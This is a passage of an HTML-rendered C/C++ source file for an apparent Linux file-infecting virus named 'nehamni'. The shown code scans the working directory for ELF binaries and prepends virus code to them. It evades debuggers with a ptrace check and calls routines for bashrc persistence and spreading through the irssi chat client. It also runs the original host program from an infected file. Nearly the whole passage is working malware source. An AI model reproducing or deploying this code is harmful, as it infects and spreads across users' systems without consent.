</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc6">"wb"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">vircode</span><span class="sc10">,</span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fHost</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">hcode</span><span class="sc10">,</span><span class="sc11">hsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fHost</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">),</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fHost</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fHost</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fTmp</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">hcode</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fNehamni</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">vircode</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InfectionSearch</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">direct</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">directPtr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statBuf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DIR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirPtr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc10">[</span><span class="sc11">MAX_DIR_PATH</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc2">//get the current working directory (cwd)
</span><span class="sc0">    </span><span class="sc2">//if we can't get it then we exit
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">getcwd</span><span class="sc10">(</span><span class="sc11">myDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DIR_PATH</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">myPath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">myDir</span><span class="sc10">,</span><span class="sc6">"/"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">dirPtr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">opendir</span><span class="sc10">(</span><span class="sc11">myDir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">dirPtr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc2">//loop through the directory
</span><span class="sc0">    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">directPtr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc11">dirPtr</span><span class="sc10">))</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">directPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">directPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc6">".."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//check to see if the file is elf
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">IsElfish</span><span class="sc10">(</span><span class="sc11">directPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Prepend</span><span class="sc10">(</span><span class="sc11">directPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//pretty cool we can do antidebug this easily:)
</span><span class="sc0">    </span><span class="sc2">//although there are probably ways around it, it's still neat.
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ptrace</span><span class="sc10">(</span><span class="sc11">PTRACE_TRACEME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"I have dreamed a dream, and my spirit was troubled to know the dream."</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">        
    </span><span class="sc10">}</span><span class="sc0">   
    
    </span><span class="sc2">//basic check to see how we are being called
</span><span class="sc0">    </span><span class="sc2">//if its running from shell as ./nehamni or as
</span><span class="sc0">    </span><span class="sc2">//a full path /home/blah/nehamni. If it's running
</span><span class="sc0">    </span><span class="sc2">//as ./nehamni then we correct it so its the full path
</span><span class="sc0">    </span><span class="sc2">//to the file. 
</span><span class="sc0">    
    </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">string</span><span class="sc10">)</span><span class="sc11">me</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pathlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">pathlen</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">substr</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"./"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cwd</span><span class="sc10">[</span><span class="sc11">MAX_DIR_PATH</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">getcwd</span><span class="sc10">(</span><span class="sc11">cwd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DIR_PATH</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">cwd</span><span class="sc10">,</span><span class="sc6">"/"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">cwd</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">substr</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">).</span><span class="sc11">c_str</span><span class="sc10">());</span><span class="sc0">
             </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">cwd</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
       </span><span class="sc10">}</span><span class="sc0">           
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc2">//start the file infection search. 
</span><span class="sc0">    </span><span class="sc11">InfectionSearch</span><span class="sc10">();</span><span class="sc0">
    
    </span><span class="sc2">//call our bashrc profile function
</span><span class="sc0">    </span><span class="sc11">Profile</span><span class="sc10">();</span><span class="sc0">
    
    </span><span class="sc2">//launch irssi spreading
</span><span class="sc0">    </span><span class="sc11">Irssi</span><span class="sc10">(</span><span class="sc11">getenv</span><span class="sc10">(</span><span class="sc6">"HOME"</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc2">//check to see if we are running as an infected file
</span><span class="sc0">    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">virstat</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,&amp;</span><span class="sc11">virstat</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">mesize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">virstat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mesize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SIZE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fTmpHost</span><span class="sc10">;</span><span class="sc0">
       </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fTmpHostWrite</span><span class="sc10">;</span><span class="sc0">
       </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostTmp</span><span class="sc10">;</span><span class="sc0">
       </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hostTmpSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mesize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SIZE</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">NAME</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
       </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hostTmpSize</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fTmpHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
               </span><span class="sc11">hostTmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">hostTmpSize</span><span class="sc10">);</span><span class="sc0">
               </span><span class="sc11">fseek</span><span class="sc10">(</span><span class="sc11">fTmpHost</span><span class="sc10">,</span><span class="sc11">SIZE</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
               </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">hostTmp</span><span class="sc10">,</span><span class="sc11">hostTmpSize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fTmpHost</span><span class="sc10">);</span><span class="sc0">
               </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc6">"tmp"</span><span class="sc10">);</span><span class="sc0">
               </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fTmpHostWrite</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc6">"wb"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                   </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">hostTmp</span><span class="sc10">,</span><span class="sc11">hostTmpSize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fTmpHostWrite</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fTmpHostWrite</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc11">virstat</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">remove</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">);</span><span class="sc0">
               </span><span class="sc10">}</span><span class="sc0">
               </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fTmpHost</span><span class="sc10">);</span><span class="sc0">
               </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">hostTmp</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc10">}</span><span class="sc0">
       </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
